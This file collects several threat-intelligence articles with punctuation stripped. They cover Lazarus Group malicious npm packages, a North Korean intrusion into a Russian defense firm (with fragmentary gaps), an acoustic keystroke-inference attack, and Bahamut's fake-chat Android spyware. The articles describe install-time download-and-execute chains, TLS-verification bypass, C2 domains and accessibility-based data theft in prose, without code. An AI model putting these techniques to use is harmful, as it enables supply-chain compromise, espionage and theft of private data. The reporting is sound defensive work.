        "text": "checkmarx-security--ListenShareDuring the last month we have been monitoring a highly targeted campaign We began tracking this threat actor in early April 2023 when our systems flagged several suspicious npm packages those packages were also flagged by our colleagues at Phylum Later GitHub confirmed that this threat actor was tied to Jade Sleet and TraderTraitor also known as the infamous Lazarus Group affiliated with North KoreaThis operation primarily preyed on companies in the blockchain and cryptocurrency sectors using a combination of social engineering and malicious npm package dependencies to infiltrate their software supply chainsActive since at least 2009 the Lazarus Group is a North Korean state-sponsored hacking group an isolated and heavily sanctioned regime Lazarus is notorious for its involvement in several high-profile and damaging cyberattacks The group is recognized not only for its cyber-espionage activities but also for its financial motivations which align well with their recent foray into blockchain and cryptocurrencyTheir infamous cyber operations portfolio includes a wide array of devastating cyberattacks over the years and is known for leveraging advanced persistent threats APTs in their operations APTs by definition are prolonged and targeted cyberattacks in which a hacker gains access to a network and remains undetected for a significant period The group has also demonstrated proficiency in spear-phishing campaigns a tactic involving deceptive emails targeted toward specific individuals or organizationsThe Lazarus Groups ventures into blockchain and cryptocurrency sectors appear to be an extension of their longstanding financially motivated activities Their operations in these areas allow them to circumvent sanctions and act in anonymity that complicates regulatory enforcementThe threat actors initiated the attack chain by impersonating developers and recruiters to target employees of technology firms focused on individuals associated with the blockchain cryptocurrency and online gambling sectors The threat actors would establish initial contact through fake persona accounts on platforms such as LinkedIn Slack and Telegram and on establishing a rapport with the targets usually shifting communication to a different platformOnce contact was established the attacker would invite the target to collaborate on a GitHub repository containing malicious npm package dependencies which would then be used to compromise the victimThe malicious packages were engineered to work in pairs and in sequential order Each pair of malicious packages were published by a separate NPM user accountThe victim would receive those two npm packages programmed to execute upon installation and served as first-stage malware that downloaded and executed second-stage malware on the victims machineOnce executed the first package would create a directory fetch updates from a remote server and save them in a fileThe second package read a token from this file made a request to a particular URL with this token wrote the response to another file and immediately executed that file as a Nodejs scriptBoth packages would also set the environmental variables on the system running it to ignore verifying SSLTLS certificatesHowever from June 29th onwards the threat actors further refined their tactics The updated packages were more synchronized and strategic They still read a token from a file and sent a POST request with the token to a specific URL The response was streamed and written to a file but execution was postponed until all the data was fully written instead of executing it immediately in the previous versions This change ensured the complete data was available before proceeding to the next step increasing the chances of a successful operationFurthermore the attackers switched from the HTTPS library to Axios for making HTTP requests providing them with more control and functionalitiesAnother notable upgrade was in error handling and managing asynchronous operations While the initial packages had basic error logging with consoleerror the new packages introduced Promise rejection handling This allowed the attacker to catch and manage errors more efficiently without abruptly terminating the operationSimilarly handling of asynchronous operations was introduced Instead of leaving the completion or failure of these tasks unattended the new packages managed them with Promise-based handling In simpler terms this upgrade allowed the attacker to wait for an operations outcome before deciding the next steps offering a more reliable and robust system for handling complex operationsAdditionally some of these improved packages now contained harder-to-detect payloads using base64 encoding a common method to conceal malware making their detection and neutralization more challengingAs we delved deeper into this attack we unearthed packages deployed by the attackers that had previously gone undetected by employing the systematic hunting of attacker TTPs We will share some of the Yara rules used for tracking these attackers YARA rules look for patterns making them especially effective in detecting and thwarting attacksWe have developed YARA rules to aid in identifying and preventing the execution of the malicious scripts used in this campaignThe utilization of social engineering techniques and the exploitation of trust within the open source communities to ensnare victims is a popular method of attack that is far from unique to this campaign It serves as a potent reminder that we cannot always trust what we seeIn some of our recent reports weve delved into these exact tacticsThis campaign serves as a reminder that while packages can be created modified and deployed with ease its the intention and tactics of those behind the packages that we need to remain most vigilant about Its not just about identifying and neutralizing threats but also understanding the threat actors their motives and their evolving tacticsThe landscape of cyber threats is in constant change and only by staying informed proactive and cautious can we hope to maintain the security of our digital ecosystemGitHub took swift action by suspending npm and GitHub accounts linked to the campaign and filing abuse reports with domain hosts to take down the URLs used by the attackersFor further details and inquiries please feel free to send an email to supplychainsecuritycheckmarxcomWorking together to keep the ecosystem

        "text": "By Tom Hegel and Aleksandar MilenkoskiWhile conducting our usual hunting and tracking of suspected-North Korean threat actors we identified a leaked email collection containing an implant with characteristics related to previously reported DPRK-affiliated threat actor campaigns A thorough investigation of the email archive revealed a larger intrusion not fully recognized at the time by the compromised organizationWe are highly confident that the emails related to this activity originate from the victim organization Furthermore there are no discernible signs of manipulation or technically verifiable inaccuracies present in these emails Its essential to highlight that the leaked data comprises a substantial volume of emails unrelated to our current research scope This suggests that the leak was likely accidental or resulted from activity unrelated to the specific intrusion under scrutiny in our investigation However this collection provides valuable background context for our understanding of their internal network design security gaps and even cases of activity by other attackersFollowing an examination of the emails and an in-depth investigation into the two separate sets of suspicious activity we have successfully established a correlation between each cluster of activity and a respective threat actor amounting to a more significant network intrusion than the victim organization realizedThis intrusion gives rare insight into sensitive DPRK cyberespionage campaigns and an opportunity to expand our understanding of the relationship and goals between various North Korean cyber threat actors It also highlights a potential rift in relations between Russia and North Korea considering their growing relationshipThis engagement establishes connections between two distinct DPRK-affiliated threat actors suggesting the potential for shared resources infrastructure implants or access to victim networks Moreover we acknowledge the possibility that the assigned task of an intrusion into NPO Mashinostroyeniya might have warranted targeting by multiple autonomous threat actors due to its perceived significanceThe OpenCarrot sample we analyzed is implemented as a Windows service DLL file intended to execute in a persistent manner In line with typical practices of the Lazarus group OpenCarrot is subject to continuous not necessarily incremental

date its likely that the timestamp is authentic Our confidence in this assessment also increases through the infrastructure analysis belowThe OpenCarrot variant we analyzed implements over 25 backdoor commands with a wide range of functionality representative of Lazarus group backdoors In this case supported functionality includesThe OpenCarrot sample displays further characteristics often seen among Lazarus Group malwareOpenCarrots versatility is evident with its support of multiple methods for communicating with C2 servers The malware dispatches commands for execution based on attacker-provided data originating not only from remote C2 servers but also from local processes through named pipes and incoming connections to a TCP port on which OpenCarrot listensWe link the NPO

was actively compromised and in communication with the attackers malicious infrastructure A review of all details concludes the threat actor was likely operating on this server for an extensive period of time prior to the internal teams discoveryThis set of malicious infrastructure was served via CrownCloud Australia and OhzCloud Spain VPS hosting providers During the intrusion the two domains centos-packagescom and redhat-packagescom were resolving to those C2 IP addresses Our assessment is that this particular cluster of infrastructure became active in November 2021 and was immediately paused the same day of NPO Mashinostroyeniyas intrusion discovery in May 2022 This finding may indicate the intrusion was high priority and closely monitored by the operatorsA relationship can be observed between this cluster of activity and a more recent ScarCruft campaign Following the intrusion operators immediately killing their C2 server when the suspicious traffic was identified by the victim in May 2022 the centos-packagescom domain use was paused until it began resolving to 16020279226 in February 2023 16020279226 is a QuickPacket VPS US hosting IP also being shared with the domain dallynkcom and others used by ScarCruft for malware delivery and C2 initiated through malicious documentsWith a high level of confidence we attribute this intrusion to threat actors independently associated with North Korea Based on our assessment this incident stands as a compelling illustration of North Koreas proactive measures to covertly advance their missile development objectives as evidenced by their direct compromise of a Russian Defense-Industrial Base DIB organizationThe convergence of North Korean cyber threat actors represents a profoundly consequential menace warranting comprehensive global monitoring Operating in unison as a cohesive cluster these actors consistently undertake a diverse range of campaigns motivated by various factors In light of these

        "text": "A team of researchers from British universities has trained a deep learning model that can steal data from keyboard keystrokes recorded using a microphone with an accuracy of 95When Zoom was used for training the sound classification algorithm the prediction accuracy dropped to 93 which is still dangerously high and a record for that mediumSuch an attack severely affects the target's data security as it could leak people's passwords discussions messages or other sensitive information to malicious third partiesMoreover contrary to other side-channel attacks that require special conditions and are subject to data rate and distance limitations acoustic attacks have become much simpler due to the abundance of microphone-bearing devices that can achieve high-quality audio capturesThis combined with the rapid advancements in machine learning makes sound-based side-channel attacks feasible and a lot more dangerous than previously anticipatedThe first step of the attack is to record keystrokes on the target's keyboard as that data is required for training the prediction algorithm This can be achieved via a nearby microphone or the target's phone that might have been infected by malware that has access to its microphoneAlternatively keystrokes can be recorded through a Zoom call where a rogue meeting participant makes correlations between messages typed by the target and their sound recordingThe researchers gathered training data by pressing 36 keys on a modern MacBook Pro 25 times each and recording the sound produced by each pressThen they produced waveforms and spectrograms from the recordings that visualize identifiable differences for each key and performed specific data processing steps to augment the signals that can be used for identifying keystrokesThe spectrogram images were used to train 'CoAtNet' which is an image classifier while the process required some experimentation with epoch learning rate and data splitting parameters until the best prediction accuracy results could be achievedIn their experiments the researchers used the same laptop whose keyboard has been used in all Apple laptops for the past two years an iPhone 13 mini placed 17cm away from the target and ZoomThe CoANet classifier achieved 95 accuracy from the smartphone recordings and 93 from those captured through Zoom Skype produced a lower but still usable 917 accuracyOther potential defense measures include using software to reproduce keystroke sounds white noise or software-based keystroke audio filtersRemember the attack model proved highly effective even against a very silent keyboard so adding sound dampeners on mechanical keyboards or switching to membrane-based keyboards is unlikely to helpUltimately employing biometric authentication where feasible and utilizing password managers to circumvent the need to input sensitive information manually also serve as mitigating factorsUpdate 816 - A Zoom spokesperson has sent BleepingComputer the following comment on the aboveZoom takes the privacy and security of our users seriouslyIn addition to the mitigation techniques suggested by the researchers Zoom users can also configure our background noise suppression feature to a higher setting mute their microphone by default when joining a meeting and mute their microphone when typing during a meeting to help keep their information more secure"

        "text": "The team at CYFIRMA recently obtained advanced Android malware targeting individuals in the South Asia region The suspicious Android malware is a dummy chatting app Our initial technical analyses revealed that APT Bahamut is behind the attack As technical analyses proceeded further we also found footprints of tactics used by DoNot APT in the suspicious app belonging to APT BahamutThe malware that was acquired was specifically utilized to target individuals residing in South Asia This particular malware exhibits a similar operational mechanism to the previously identified malware distributed through the Google Play Store by the notorious APT group known as DoNot however this malware has more permissions and thus presents a higher level of threat The suspected Android malware known initially as CoverIm was delivered to victims via WhatsApp and was found to be disguised as a dummy chatting application named SafeChat The user interface of this app successfully deceives users into believing its authenticity allowing the threat actor to extract all the necessary information before the victim realizes that the app is a dummy the malware cleverly exploits unsuspecting Android Libraries to extract and transmit data to a command-and-control server Our in-depth technical analysis will provide a comprehensive overview of this Android malware and shed light on the sophisticated methods employed by the threat actor to exploit Android Libraries for the purpose of data retrieval from victims mobile devices Lets dive into the technical analysesAfter installation a suspected app with the name Safe Chat appears on the main menuAfter opening the app the user is shown a landing page where the user is notified of operating a secure chatting appUpon opening the app after fresh installation the pop-up message instructs the user to allow permissionThe below screenshot shows the app throwing another pop-up message and asking the user for permission to keep the app working in the background Once allowed the app will work even when the app is minimized or closed This permission will let command and control seamlessly communicate with the appOnce permission for ignoring battery optimization is allowed the user is allowed to sign in and sign-upThe sign-up pageAfter completion the app signs you in and then the user is shown another pop-up message for permission This time it throws a pop-up showing the need for another permission app to work properlyOnce the user clicks on Allow as shown in the previous screenshot the app takes the user to the accessibility page and asks the victim to enable accessibility for the Safe Chat app Once the accessibility is on then the malware will capture activity on screen including keystrokes Until it is enabled the app will throw a pop-up message again and again as shown in the previous screenshotAfter enabling accessibility for the Safe Chat app it works properly showing a different dummy page like any other chatting appThis excerpt is from the Android Manifest file that belongs to the suspicious Safe Chat Android app showing permissions that are being employed by the app to perform malicious activityThis table contains permissions that are dangerous if exploited for malicious activityAnother snippet from the Android Manifest file shows that the threat actor designed the app to interact with other already installed chat applications The interaction will take place using intents OPENDOCUMENTTREE permission will select specific directories and access apps mentioned in intentPart of the Kotlin code shows the exploitation of various permissions the object LibConfigKt deals with the enabling and disabling of permissions and the same object is called in different modules to exploit the permissions accessed by the suspicious AppThis excerpt shows the API module that is being used as a command-and-control server Port 2053 is configured to the domain where the transportation of data takes placeThe snippet below shows comments passed in one of the modules revealing the use of the Ktor framework developed with Kotlin Ktor is employed to establish communication between the command-and-control server and the app Last month our report exposed Android malware belonging to the DoNot APT which had employed a similar library called retrofit for HTTP requests in their Android Malware deployed on the Google Play Store The malicious app has since been deletedHere are some more out-takes from another module that interacts with the App as part of monitoring different messenger apps like Telegram Signal Facebook Messenger etcThese snapshots are from a module that reveals the creation of JSON Object which stores fetched information such as IMEI Device ID and SIM details including locationThe following is from the module that performs RSA Encryption using the public keyThese module snapshots demonstrate the function of the encryption method to start the process of encrypting data The analyses reveal that the threat actor is storing data in encrypted form using RSAECBOAEPPaddingThe following demonstrates a captured Live HTTP request which shows the letsencrypt certificate being used for encrypted communication between the app and server to dodge network interceptionThrough our technical analyses we confidently attribute this attack to APT Bahamut However the tactics employed by this threat actor are similar to the tactics employed by APT DoNot and it is also interesting to note that the target geography of both the threat actors is similar to each otherIn this specific attack the threat actor conducted targeted spear messaging attacks on WhatsApp Messenger focusing on individuals in the South Asia region The malicious payload was delivered directly through WhatsApp chat The attack on the individual served the interest of one nation state government The nature of this attack along with previous incidents involving APT Bahamut possibly indicate that it was carried out to serve the interests of one nation state government Notably APT Bahamut has previously targeted Khalistan supporters advocating for a separate nation posing an external threat to India The threat actor has also aimed at military establishments in Pakistan and individuals in Kashmir all aligning with the interests of one nation state governmentWe are unable to disclose the specific target location of the sensitive cyber-attack due to its sensitivity and security concerns However we can confirm that the target serves the interests of one nation state government While some security organizations initially identified the threat as originating from a mercenary group our own analysis indicates that it is in fact an Indian APT group acting on behalf of one nation state government Several reasons support this conclusionFirstly it is highly unlikely that the said nation state government will employ mercenary groups for hacking sensitive targets unless the group is based within Indian territory Based on past and present targets it strongly suggests that the APT group operates within Indian territory Furthermore the threat actor utilized encryption techniques to secure the data and network traffic using the same certificate authority as the DoNot APT group which previously deployed Android Malware on the Google Play Store Moreover the APT actor employed the Ktor Library to efficiently fetch and transfer data to the command-and-control server a tactic similar to how the DoNot APT group used retrofit for a similar data retrieval functionTaking all these factors into account our analysis strongly indicates that the APT group behind the attack has ties to the Indian territory and is acting in the interest of one nation state governmentCopyright CYFIRMA All rights reservedYour iFrame Code"
